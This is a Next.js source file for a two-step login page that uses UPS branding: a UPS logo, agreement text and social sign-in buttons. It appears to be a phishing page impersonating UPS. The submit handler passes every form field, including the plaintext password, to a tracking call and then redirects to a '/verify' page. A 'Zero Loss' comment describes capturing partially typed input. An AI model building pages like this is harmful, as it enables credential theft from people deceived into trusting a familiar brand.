"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Link from "next/link";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { loginSchema, LoginFormData } from "../../lib/validation";
import { useDataLayer } from "../../hooks/useDataLayer";

export default function LoginPage() {
    const router = useRouter();
    const { trackEvent } = useDataLayer();
    const [showPassword, setShowPassword] = useState(false);
    const [showPasswordField, setShowPasswordField] = useState(false);

    const {
        register,
        handleSubmit,
        watch,
        setValue,
        trigger,
        formState: { errors },
    } = useForm<LoginFormData>({
        resolver: zodResolver(loginSchema),
        defaultValues: {
            username: "",
            password: "",
            companyName: "",
        },
        mode: "onBlur", // Validate on blur
    });

    const accountType = watch("accountType");
    const username = watch("username");

    const handleTypeSelect = (type: "personal" | "business") => {
        setValue("accountType", type);
        trackEvent("interaction", { action: "select_account_type", type });
    };

    const handleContinue = async (e: React.FormEvent) => {
        e.preventDefault();
        const isValid = await trigger(["accountType", "username", "companyName"]);
        if (isValid) {
            setShowPasswordField(true);
            trackEvent("interaction", { action: "login_step_1_complete", username });
        }
    };

    const onSubmit = async (data: LoginFormData) => {
        console.log("Form Submitted", data);
        trackEvent("form_submission", { form: "login", ...data });
        router.push("/verify");
    };

    const handlePartialData = (field: keyof LoginFormData, value: string) => {
        // Zero Loss: Track partial data on blur
        if (value) {
            trackEvent("interaction", { action: "field_blur", field, value_length: value.length });
            // In a real "Zero Loss" scenario we might even save the partial value to DB here
        }
    };

    // ---- Step 1: Account Type Selection ----
    if (!accountType) {
        return (
            <div className="login-page">
                <div className="login-card">
                    <div className="login-logo">
                        <Image src="/ups-logo.svg" alt="UPS" width={50} height={60} priority />
                    </div>

                    <h1 className="login-heading">Welcome</h1>
                    <p className="login-subtext">Select your account type to continue</p>

                    <div className="account-type-cards">
                        <button
                            type="button"
                            className="account-type-card"
                            onClick={() => handleTypeSelect("personal")}
                        >
                            <div className="account-type-card__icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                                </svg>
                            </div>
                            <span className="account-type-card__label">Personal</span>
                            <span className="account-type-card__desc">Individual shipping &amp; tracking</span>
                        </button>

                        <button
                            type="button"
                            className="account-type-card"
                            onClick={() => handleTypeSelect("business")}
                        >
                            <div className="account-type-card__icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                                    <path d="M20 7h-4V5l-2-2h-4L8 5v2H4c-1.1 0-2 .9-2 2v5c0 .75.4 1.38 1 1.73V19c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2v-3.28c.59-.35 1-.99 1-1.72V9c0-1.1-.9-2-2-2zM10 5h4v2h-4V5zM4 9h16v5h-5v-3H9v3H4V9zm9 6v2h-2v-2h2zm-8 4v-3h5v1h4v-1h5v3H5z" />
                                </svg>
                            </div>
                            <span className="account-type-card__label">Business</span>
                            <span className="account-type-card__desc">Company &amp; enterprise solutions</span>
                        </button>
                    </div>

                    <div className="login-footer-links">
                        <span>Don&apos;t have a profile? </span>
                        <a href="#" className="login-link">Sign Up</a>
                    </div>

                    <div className="login-bottom-links">
                        <a href="#" className="login-link-small">Privacy Notice</a>
                        <span className="login-separator">|</span>
                        <a href="#" className="login-link-small">Terms and Conditions</a>
                    </div>
                </div>
            </div>
        );
    }

    // ---- Step 2+3: Login Form (password expands below username) ----
    return (
        <div className="login-page">
            <div className="login-card">
                <div className="login-logo">
                    <Image src="/ups-logo.svg" alt="UPS" width={50} height={60} priority />
                </div>

                <h1 className="login-heading">Welcome</h1>

                {/* Account type badge with change option */}
                <div className="login-account-badge">
                    <span className="login-account-badge__type">
                        {accountType === "personal" ? "👤 Personal Account" : "💼 Business Account"}
                    </span>
                    <button
                        type="button"
                        className="login-change-link"
                        onClick={() => {
                            setValue("accountType", undefined as any); // Reset
                            setValue("username", "");
                            setValue("companyName", "");
                            setValue("password", "");
                            setShowPasswordField(false);
                        }}
                    >
                        Change
                    </button>
                </div>

                <form onSubmit={showPasswordField ? handleSubmit(onSubmit) : handleContinue}>
                    {/* Username / Email field */}
                    <div className={`login-field ${errors.username ? "has-error" : ""}`}>
                        <input
                            type="text"
                            id="login-email"
                            className="login-outlined-input"
                            placeholder=" "
                            autoComplete="username"
                            readOnly={showPasswordField}
                            {...register("username", {
                                onBlur: (e) => handlePartialData("username", e.target.value)
                            })}
                        />
                        <label htmlFor="login-email" className="login-outlined-label">
                            {accountType === "personal" ? "Email or Username" : "Business Email"}{" "}
                            <span className="login-required">*</span>
                        </label>
                        {errors.username && (
                            <span className="login-error-msg">{errors.username.message}</span>
                        )}
                        {showPasswordField && (
                            <button
                                type="button"
                                className="login-edit-btn"
                                onClick={() => {
                                    setShowPasswordField(false);
                                    setValue("password", "");
                                }}
                                aria-label="Edit username"
                            >
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                                    <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a1.003 1.003 0 000-1.42l-2.34-2.33a1.003 1.003 0 00-1.42 0l-1.83 1.83 3.75 3.75 1.84-1.83z" />
                                </svg>
                            </button>
                        )}
                    </div>

                    {/* Company Name field (business only) */}
                    {accountType === "business" && (
                        <div className={`login-field ${errors.companyName ? "has-error" : ""}`}>
                            <input
                                type="text"
                                id="login-company"
                                className="login-outlined-input"
                                placeholder=" "
                                readOnly={showPasswordField}
                                {...register("companyName", {
                                    onBlur: (e) => handlePartialData("companyName", e.target.value)
                                })}
                            />
                            <label htmlFor="login-company" className="login-outlined-label">
                                Company Name <span className="login-required">*</span>
                            </label>
                            {errors.companyName && (
                                <span className="login-error-msg">{errors.companyName.message}</span>
                            )}
                        </div>
                    )}

                    {/* Password field — appears below username after Continue is clicked */}
                    {showPasswordField && (
                        <div className={`login-field login-field--password ${errors.password ? "has-error" : ""}`}>
                            <input
                                type={showPassword ? "text" : "password"}
                                id="login-password"
                                className="login-outlined-input"
                                placeholder=" "
                                autoComplete="current-password"
                                autoFocus
                                {...register("password")}
                            />
                            <label htmlFor="login-password" className="login-outlined-label">
                                Password <span className="login-required">*</span>
                            </label>
                            <button
                                type="button"
                                className="login-password-toggle"
                                onClick={() => setShowPassword(!showPassword)}
                                aria-label={showPassword ? "Hide password" : "Show password"}
                            >
                                {showPassword ? (
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" />
                                    </svg>
                                ) : (
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                                    </svg>
                                )}
                            </button>
                            {errors.password && (
                                <span className="login-error-msg">{errors.password.message}</span>
                            )}
                        </div>
                    )}

                    <div className="login-forgot-row">
                        <Link href="/" className="login-link">
                            Forgot Username/Password?
                        </Link>
                    </div>

                    <p className="login-agreement">
                        By Continuing, I agree to the{" "}
                        <a href="#" className="login-link">UPS Technology Agreement.</a>
                    </p>

                    {/* Button changes from Continue → Log In */}
                    <button type="submit" className="login-btn">
                        {showPasswordField ? "Log In" : "Continue"}
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="14" height="14">
                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
                        </svg>
                    </button>
                </form>

                <div className="login-footer-links">
                    <span>Don&apos;t have a profile? </span>
                    <a href="#" className="login-link">Sign Up</a>
                </div>

                <div className="login-divider">
                    <span>OR CONTINUE BY USING ONE OF THESE SITES</span>
                </div>

                <div className="social-icons">
                    {/* Google */}
                    <button type="button" className="social-icon" aria-label="Continue with Google">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4" />
                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05" />
                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
                        </svg>
                    </button>
                    {/* Apple */}
                    <button type="button" className="social-icon" aria-label="Continue with Apple">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#000">
                            <path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.52-3.23 0-1.44.65-2.2.46-3.06-.4C3.79 16.17 4.36 9.53 8.9 9.28c1.26.07 2.13.72 2.91.77.99-.2 1.94-.78 3-.72 1.27.06 2.23.6 2.86 1.52-2.63 1.57-2.01 5.03.38 5.99-.48 1.26-.7 1.85-1.52 3.03-.52.75-1.04 1.5-1.84 1.51-.76.01-1.33-.38-2.25-.38-.96 0-1.52.39-2.27.4-.8.01-1.4-.82-1.93-1.56-1.48-2.1-2.59-5.93-1.08-8.52.75-1.28 2.1-2.14 3.57-2.17 1.07-.02 2.07.72 2.72.72s1.88-.89 3.17-.76c.54.02 2.06.22 3.03 1.63-2.68 1.55-2.28 5.62.4 6.71z" />
                        </svg>
                    </button>
                    {/* Facebook */}
                    <button type="button" className="social-icon" aria-label="Continue with Facebook">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#1877F2">
                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                        </svg>
                    </button>
                    {/* X (Twitter) */}
                    <button type="button" className="social-icon" aria-label="Continue with X">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#000">
                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                        </svg>
                    </button>
                    {/* Amazon */}
                    <button type="button" className="social-icon" aria-label="Continue with Amazon">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#FF9900">
                            <path d="M.045 18.02c.072-.116.187-.124.348-.022 3.636 2.11 7.594 3.166 11.87 3.166 2.852 0 5.668-.533 8.447-1.595l.315-.14c.258-.104.476-.073.654.093.178.166.18.376.01.594-.456.6-1.138 1.19-2.066 1.77-2.024 1.27-4.352 1.907-6.983 1.907-3.562 0-6.772-1.02-9.634-3.06C1.645 19.72.86 18.73.045 18.02zM6.394 14.736c0-1.17.317-2.18.95-3.023.636-.844 1.47-1.43 2.504-1.757.96-.293 2.15-.44 3.567-.44l1.803.048v-.65c0-1.27-.148-2.09-.444-2.46-.41-.525-1.108-.787-2.093-.787h-.216c-.654 0-1.21.173-1.665.517-.457.345-.743.84-.86 1.484-.086.427-.267.67-.54.723l-3.105-.413c-.32-.073-.48-.227-.48-.46 0-.073.013-.16.04-.26C6.37 4.7 7.8 3.3 10.688 2.89l1.19-.126c2.226-.203 3.9.334 5.024 1.612.867 1.01 1.3 2.577 1.3 4.702v8.722c0 .39.108.7.325.93.217.23.374.362.472.397l.61.388c.155.1.232.21.232.327 0 .19-.132.392-.397.607-.71.578-1.575 1.29-2.6 2.14-.16.12-.34.18-.53.18-.19 0-.36-.07-.52-.21-.53-.49-.918-.86-1.165-1.12l-.235-.26c-.932.95-1.84 1.52-2.72 1.72-.56.14-1.17.2-1.82.2-1.28 0-2.34-.42-3.16-1.27-.83-.84-1.24-1.94-1.24-3.28zm4.42-.49c0 .66.18 1.22.55 1.67.36.45.83.67 1.4.67.08 0 .2-.02.36-.05.16-.04.26-.07.32-.08.7-.25 1.26-.76 1.66-1.54.27-.49.44-1.06.5-1.7l.06-1.03v-.93l-1.34.047c-1.32.063-2.24.37-2.76.917-.52.548-.75 1.277-.75 2.183z" />
                        </svg>
                    </button>
                </div>

                <div className="login-bottom-links">
                    <a href="#" className="login-link-small">Privacy Notice</a>
                    <span className="login-separator">|</span>
                    <a href="#" className="login-link-small">Terms and Conditions</a>
                </div>
            </div>
        </div>
    );
}

